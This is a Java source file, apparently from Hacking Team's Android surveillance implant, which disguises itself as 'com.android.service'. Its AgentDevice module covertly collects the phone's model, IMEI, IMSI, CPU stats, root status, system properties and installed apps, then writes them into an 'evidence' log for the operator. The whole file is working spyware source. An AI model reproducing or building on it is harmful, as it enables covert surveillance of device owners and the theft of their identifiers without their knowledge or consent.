/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.module;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.ByteOrder;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Properties;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.drawable.Drawable;
import android.os.Build;

import com.android.service.Device;
import com.android.service.LogR;
import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.conf.ConfModule;
import com.android.service.evidence.EvidenceType;
import com.android.service.util.Check;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

/**
 * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f
 * =src/com/android/settings;h=1d1b538ef4728c9559da43828a7df9e9bb5c512f;hb=HEAD
 * 
 * @author zeno
 * 
 */
public class AgentDevice extends BaseInstantModule {

	/** The Constant TAG. */
	private static final String TAG = "AgentDevice"; //$NON-NLS-1$

	/** The process list. */
	private boolean processList;

	/** The cpu usage. */
	private float cpuUsage;

	/** The cpu total. */
	private long cpuTotal;

	/** The cpu idle. */
	private long cpuIdle;

	/**
	 * Instantiates a new device agent.
	 */
	public AgentDevice() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " DeviceAgent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {		
		this.processList = true;
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void actualStart() {

		// OS Version etc...
		if (Cfg.DEBUG) {
			Check.log(TAG + " Android");//$NON-NLS-1$
		}

		final Runtime runtime = Runtime.getRuntime();
		final Properties properties = System.getProperties();
		readCpuUsage();

		final StringBuffer sb = new StringBuffer();
		if (Cfg.DEBUG) {
			sb.append("Debug\n"); //$NON-NLS-1$
			final String timestamp = System.getProperty("build.timestamp"); //$NON-NLS-1$
			if (timestamp != null) {
				sb.append(timestamp + "\n"); //$NON-NLS-1$
			}
		}
		
		// SYSTEM
		sb.append(Messages.getString("9.3") + "\n"); //$NON-NLS-1$
		sb.append(Messages.getString("9.22") + Build.BOARD + "\n");
		sb.append(Messages.getString("9.23") + Build.BRAND + "\n");
		sb.append(Messages.getString("9.24") + Build.DEVICE + "\n");
		sb.append(Messages.getString("9.25") + Build.MODEL + "\n");
		sb.append(Messages.getString("9.26") + Build.DISPLAY + "\n");

		sb.append(Messages.getString("9.4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		if (Device.self().getImei().length() == 0) {
			sb.append(Messages.getString("9.6") + "\n"); //$NON-NLS-1$
		} else {
			sb.append(Messages.getString("9.7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		sb.append(Messages.getString("9.9") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(Messages.getString("9.11") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(Messages.getString("9.13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		if (Status.self().haveRoot()) {
			sb.append(Messages.getString("9.15") + "\n"); //$NON-NLS-1$
		} else {
			sb.append(Messages.getString("9.16") + "\n"); //$NON-NLS-1$
		}

		sb.append(Messages.getString("9.17") + "\n"); //$NON-NLS-1$
		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();

		while (it.hasNext()) {
			final Entry<Object, Object> pairs = it.next();
			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		if (processList ) {
			processList=false;
			final ArrayList<PInfo> apps = getInstalledApps(false); /*
																	 * false =
																	 * no system
																	 * packages
																	 */
			final int max = apps.size();

			for (int i = 0; i < max; i++) {
				sb.append(apps.get(i) + "\n"); //$NON-NLS-1$

			}
		}

		final String content = sb.toString();

		// final int ev = Evidence.convertTypeEvidence(AgentConf.AGENT_DEVICE);

		// atomic log
		// LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD, null,
		// WChar.getBytes(content, true));

		// log
		final LogR log = new LogR(EvidenceType.DEVICE, LogR.LOG_PRI_STD);
		log.write(WChar.getBytes(content, true));
		log.close();

		// Evidence
		// final Evidence evidence = new Evidence(Agent.AGENT_DEVICE);
		// evidence.atomicWriteOnce(null, EvidenceType.DEVICE,
		// WChar.getBytes(content, true));

	}

	/**
	 * Read cpu usage.
	 */
	private void readCpuUsage() {
		try {
			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(
					Messages.getString("9.21"))), //$NON-NLS-1$
					1000);
			final String load = reader.readLine();
			reader.close();

			final String[] toks = load.split(" "); //$NON-NLS-1$

			final long currTotal = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
			final long currIdle = Long.parseLong(toks[5]);

			this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal - cpuTotal + currIdle - cpuIdle));
			this.cpuTotal = currTotal;
			this.cpuIdle = currIdle;
		} catch (final IOException ex) {
			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
			}
		}
	}

	/**
	 * The Class PInfo.
	 */
	class PInfo {

		/** The appname. */
		private String appname = ""; //$NON-NLS-1$

		/** The pname. */
		private String pname = ""; //$NON-NLS-1$

		/** The version name. */
		private String versionName = ""; //$NON-NLS-1$

		/** The version code. */
		private int versionCode = 0;

		/** The icon. */
		private Drawable icon;

		/*
		 * (non-Javadoc)
		 * 
		 * @see java.lang.Object#toString()
		 */
		@Override
		public String toString() {
			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		}

	}

	/**
	 * Gets the packages.
	 * 
	 * @return the packages
	 */
	private ArrayList<PInfo> getPackages() {
		final ArrayList<PInfo> apps = getInstalledApps(false); /*
																 * false = no
																 * system
																 * packages
																 */
		final int max = apps.size();
		for (int i = 0; i < max; i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
			}
		}
		return apps;
	}

	/**
	 * Gets the installed apps.
	 * 
	 * @param getSysPackages
	 *            the get sys packages
	 * @return the installed apps
	 */
	private ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
		final ArrayList<PInfo> res = new ArrayList<PInfo>();
		final PackageManager packageManager = Status.getAppContext().getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);
		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);
			if ((!getSysPackages) && (p.versionName == null)) {
				continue;
			}
			final PInfo newInfo = new PInfo();
			newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
			newInfo.pname = p.packageName;
			newInfo.versionName = p.versionName;
			newInfo.versionCode = p.versionCode;
			newInfo.icon = p.applicationInfo.loadIcon(packageManager);
			res.add(newInfo);
		}
		return res;
	}
}
